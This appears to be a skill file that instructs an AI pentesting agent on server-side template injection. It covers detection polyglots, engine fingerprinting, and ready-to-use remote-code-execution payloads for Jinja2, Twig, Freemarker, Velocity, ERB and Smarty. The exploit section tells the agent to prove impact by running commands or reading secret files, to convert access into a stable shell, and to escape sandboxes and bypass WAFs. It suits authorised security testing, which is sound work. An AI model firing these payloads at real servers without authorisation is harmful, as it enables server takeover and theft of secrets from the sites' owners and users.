---
name: web-ssti
description: Server-Side Template Injection detection→engine-fingerprint→RCE for web apps. Use when user input renders into a server-side template (names, greetings, email/PDF/report generators, error pages, profile fields) and math payloads evaluate. Triggers - {{7*7}} returns 49, ${7*7}, #{7*7}, Jinja2/Twig/Freemarker/Velocity/ERB/Handlebars, TemplateSyntaxError, freemarker.core.
tags: [vuln_assess, exploitation]
---

# Server-Side Template Injection (SSTI)

## When this fires
Reflected input where a math/template payload EVALUATES server-side (not just echoes). Common sinks: name/greeting fields, email/PDF/report/invoice generators, custom error pages, admin templates.

## Detect
Send the polyglot; if any arithmetic evaluates, it's SSTI (reflected ≠ executed — the value must be COMPUTED):
```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  @(7*7)
```
`49`/`7777777` back = hit. Then fingerprint the engine to pick the RCE path.

## Decide — fingerprint the engine
- `{{7*7}}`=49 but `{{7*'7'}}` → `7777777` = **Jinja2/Twig (Python/PHP)**; `TemplateError` = Jinja2.
- `${7*7}`=49 = **Freemarker/Velocity (Java)** or JSP EL.
- `#{7*7}` = **Ruby ERB / Thymeleaf / JSF**.
- `<%= 7*7 %>` = **ERB (Ruby)** / EJS (Node).
- `${{7*7}}` errors but `{{7*7}}` ok = **Handlebars/Node**.

## Exploit → PROVE IMPACT (engine-specific RCE)
```
Jinja2:   {{cycler.__init__.__globals__.os.popen('id').read()}}
          {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
Twig:     {{['id']|filter('system')}}  /  {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
Velocity: #set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",...)...("id")
ERB:      <%= `id` %>  /  <%= system('id') %>
Smarty:   {system('id')}  /  {php}system('id');{/php}
```
**Proof required:** `id`/`uname -a` output (RCE), or read a secret file. Then convert to a stable shell / `record_artifact`.

## Tooling
`tplmap -u '<url>?p=*'` (auto-detect+exploit) if available; else manual per above. `nuclei -tags ssti`.

## False positives / pitfalls
- Client-side echo (value reflected but NOT computed) = XSS, not SSTI.
- Sandboxed engine (Twig sandbox, Jinja2 SandboxedEnvironment) → try the sandbox-escape gadgets from PayloadsAllTheThings before concluding dead.
- WAF stripping `{{ }}` → try `${}`, `#{}`, whitespace/comment obfuscation.
